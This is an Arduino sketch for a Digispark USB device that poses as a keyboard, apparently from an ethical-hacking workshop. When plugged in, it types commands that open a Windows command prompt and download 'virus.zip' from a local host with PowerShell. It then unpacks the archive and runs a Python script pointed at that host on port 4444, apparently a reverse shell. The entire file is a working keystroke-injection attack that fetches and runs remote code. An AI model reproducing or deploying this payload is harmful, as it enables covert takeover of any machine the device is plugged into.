#include "DigiKeyboard.h"

/**
 * This workshop is for educational purposes only.
 * Ethical hacking is conducted with the explicit permission of the system owner to improve security.
 */

void setup() {
    // Open the terminal
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(600);
    DigiKeyboard.print("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Change the directory the %TEMP%
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("cd %TEMP%");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Download a portable python and a script
    DigiKeyboard.delay(3000);
    DigiKeyboard.print("powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.147:8080/virus.zip', 'virus.zip')\"");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Unzip the python
    DigiKeyboard.delay(5000);
    DigiKeyboard.print("powershell -Command \"Expand-Archive -Path virus.zip -DestinationPath .\"");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Run the python script
    DigiKeyboard.delay(3000);
    DigiKeyboard.print(".\\virus\\python.exe virus\\script.py 192.168.1.147 4444");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {
  //empty
}